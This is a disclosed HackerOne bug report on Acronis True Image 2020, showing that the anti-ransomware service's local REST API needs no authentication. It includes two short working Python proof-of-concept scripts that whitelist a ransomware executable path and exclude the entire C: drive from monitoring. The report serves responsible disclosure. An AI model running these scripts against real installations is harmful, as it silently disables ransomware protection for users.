---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '858608'
original_report_id: '858608'
title: anti_ransomware_service.exe REST API does not require authentication
weakness: Missing Authentication for Critical Function
team_handle: acronis
created_at: '2020-04-24T11:41:13.411Z'
disclosed_at: '2021-06-24T08:20:51.161Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
asset_identifier: Acronis Cyber Protect Home Office (formerly Acronis True Image)
asset_type: DOWNLOADABLE_EXECUTABLES
max_severity: critical
tags:
- hackerone
- missing-authentication-for-critical-function
---

# anti_ransomware_service.exe REST API does not require authentication

## Metadata

- HackerOne Report ID: 858608
- Weakness: Missing Authentication for Critical Function
- Program: acronis
- Disclosed At: 2021-06-24T08:20:51.161Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

anti_ransomware_service.exe exposes a REST API that can be used by everyone, even unprivileged users. This API is used to communicate from the Acronis True Image 2020 GUI to the anti_ransomware_service.exe. This can be exploited to add an arbitary malicious executable to the whitelist or even exclude the entire drive from being monitored by anti_ransomware_service.exe.

Add executable to whitelist, steps to reproduce:
1. Run the python script "add_executable_to_whitelist.py". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.
2. Verify in the Acronis True Image 2020 GUI that the executable "C:\ProgramData\ransomware_exe.exe" is whitelisted.

add_executable_to_whitelist.py:
"""
import requests
import json

put_headers = {'User-Agent': 'AcronisRestClient', "Accept": "application/json",
    "Content-Type":"application/json"}

data = {
   "additions" : [
      {
         "path" : "C:\\ProgramData\\ransomware_exe.exe"
      }
   ],
   "removals" : []
}
r1 = requests.put('http://localhost:6109/lists/processImages/white', headers=put_headers, data=json.dumps(data))
print(r1.content)
"""

Exclude drive from monitoring, steps to reproduce:
1. Run the python script "exclude_drive_from_anti_ransomware.py". This could of course be written in a compiled language, such that the executable did not need an installed interpreter. Example code can be found below.
2. Verify in the Acronis True Image 2020 GUI that the path "C:\*" is excluded.

exclude_drive_from_anti_ransomware.py:
"""
import requests
import json
import time

put_headers = {'User-Agent': 'AcronisRestClient', "Accept": "application/json",
    "Content-Type":"application/json"}

data = {
   "additions" : [
      {
         "path" : "C:\\*"
      }
   ],
   "removals" : []
}
r1 = requests.put('http://localhost:6109/lists/excludes', headers=put_headers, data=json.dumps(data))
print(r1.content)
"""

## Impact

This could silently disable the anti_ransomware_service.exe by whitelisting the specific ransomware executable or excluding the entire system drive from inspection.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
